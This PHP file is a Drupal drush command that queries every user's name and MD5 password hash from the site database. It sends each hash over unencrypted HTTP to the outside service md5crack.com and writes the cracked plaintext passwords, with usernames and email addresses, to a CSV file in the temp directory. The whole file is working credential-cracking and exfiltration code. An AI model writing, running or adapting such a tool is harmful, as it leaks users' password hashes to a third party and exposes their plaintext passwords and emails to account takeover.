<?php

/**
 * Implements hook_drush_command().
 */
function md_reverse_drush_command() {
  $items['md_reverse'] = array(
    'description' => dt('Exports reversable users to a file in the tmp directory'),
  );
  return $items;
}

/**
 * Creates a CSV of users who's passwords we were able to reverse lookup
 */
function drush_md_reverse() {
  $sql     = "SELECT uid, name, pass FROM users;";
  $result  = db_query($sql);
  $total   = $result->num_rows !== NULL ?
    $result->num_rows : db_result(db_query("SELECT count(1) FROM users;"));
  $users   = array();
  $i       = 0;
  $cracked = 0;
  $fp      = fopen(
    variable_get('file_directory_temp', '/tmp') . '/md_reverse.csv', 'w'
  );

  while ($row = db_fetch_object($result)) {
    $u       = user_load($row->uid);

    if (($reverse = md_reverse_md5CrackCom($u->pass)) !== FALSE) {
      $users[$u->uid] = array(
        'uid'      => md_reverse_empty($u->uid),
        'name'     => md_reverse_empty($u->name),
        'mail'     => md_reverse_empty($u->mail),
        'md5'      => md_reverse_empty($u->pass),
        'password' => $reverse,
      );
      fputcsv($fp, (array) $users[$u->uid]);
      $cracked++;
    }

    $i++;
    echo "$i / $total \n";
  }
  fclose($fp);

  echo "Total passwords cracked: $cracked of $total";
}

/**
 * returns an empts string if the input is null or false or the input if there
 * is anything positive to return
 * 
 * @param mixed string|bool|NULL $x
 * 
 * @return string
 */
function md_reverse_empty($x) {
  return empty($x) ? '' : $x;
}

/**
 * Does an API request to md5crack.com
 * 
 * @param string $md5
 * @return mixed boolean|string
 */
function md_reverse_md5CrackCom($md5) {
  // Variables
  $type   = "crack";
  $apikey = "XXXXXXXXX";

  $return = json_decode(
    file_get_contents(
      "http://api.md5crack.com/" . $type . "/" . $apikey . "/" . $md5
    )
  );

  echo $return->response . "\n";

  if ($return->code == 6) {
    return $return->parsed;
  }
  else {
    return FALSE;
  }
}